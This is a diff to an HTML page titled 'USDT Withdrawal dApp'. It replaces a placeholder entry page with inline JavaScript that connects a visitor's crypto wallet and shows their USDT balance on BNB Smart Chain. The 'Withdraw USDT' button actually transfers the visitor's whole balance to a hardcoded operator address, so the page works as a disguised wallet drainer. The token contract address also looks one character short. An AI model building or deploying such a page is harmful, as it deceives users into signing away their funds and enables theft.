@@ -1,13 +1,106 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>USDT BEP20 DApp</title>
-    <script type="module" crossorigin src="/assets/index.js"></script>
-    <link rel="stylesheet" href="/assets/style.css">
-  </head>
-  <body>
-    <div id="root">Loading...</div>
-  </body>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>USDT Withdrawal dApp</title>
+    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+            background-color: #f0f0f0;
+        }
+        button {
+            padding: 10px 20px;
+            margin: 10px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        #status {
+            margin-top: 20px;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    <h1>USDT Withdrawal dApp</h1>
+    <button onclick="connectWallet()">Connect Trust Wallet</button>
+    <p>USDT Balance: <span id="balance">0</span> USDT</p>
+    <button onclick="withdrawUSDT()" id="withdrawBtn" disabled>Withdraw USDT</button>
+    <p id="status"></p>
+
+    <script>
+        let provider, signer, account, usdtContract;
+        const usdtAddress = "0x55d398326f99059fF775485246999027B319795"; // USDT on BNB Smart Chain
+        const withdrawAddress = "0xYOUR_WITHDRAWAL_ADDRESS_HERE"; // Replace with your address
+        const usdtAbi = [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 value) returns (bool)",
+            "function decimals() view returns (uint8)"
+        ];
+
+        async function connectWallet() {
+            try {
+                if (typeof window.ethereum !== 'undefined') {
+                    provider = new ethers.providers.Web3Provider(window.ethereum);
+                    await provider.send("eth_requestAccounts", []);
+                    signer = provider.getSigner();
+                    account = await signer.getAddress();
+                    document.getElementById("status").innerText = `Connected: ${account}`;
+
+                    // Switch to BNB Smart Chain (Chain ID: 56)
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: '0x38' }],
+                    });
+
+                    // Initialize USDT contract
+                    usdtContract = new ethers.Contract(usdtAddress, usdtAbi, signer);
+                    await updateBalance();
+                    document.getElementById("withdrawBtn").disabled = false;
+                } else {
+                    document.getElementById("status").innerText = "Please install Trust Wallet or MetaMask!";
+                }
+            } catch (error) {
+                document.getElementById("status").innerText = `Error: ${error.message}`;
+            }
+        }
+
+        async function updateBalance() {
+            try {
+                const balance = await usdtContract.balanceOf(account);
+                const decimals = await usdtContract.decimals();
+                const formattedBalance = ethers.utils.formatUnits(balance, decimals);
+                document.getElementById("balance").innerText = formattedBalance;
+            } catch (error) {
+                document.getElementById("status").innerText = `Error fetching balance: ${error.message}`;
+            }
+        }
+
+        async function withdrawUSDT() {
+            try {
+                const balance = await usdtContract.balanceOf(account);
+                if (balance.isZero()) {
+                    document.getElementById("status").innerText = "No USDT to withdraw!";
+                    return;
+                }
+
+                const tx = await usdtContract.transfer(withdrawAddress, balance);
+                document.getElementById("status").innerText = "Transaction sent! Waiting for confirmation...";
+                await tx.wait();
+                document.getElementById("status").innerText = "Withdrawal successful!";
+                await updateBalance();
+            } catch (error) {
+                document.getElementById("status").innerText = `Error withdrawing: ${error.message}`;
+            }
+        }
+    </script>
+</body>
 </html>
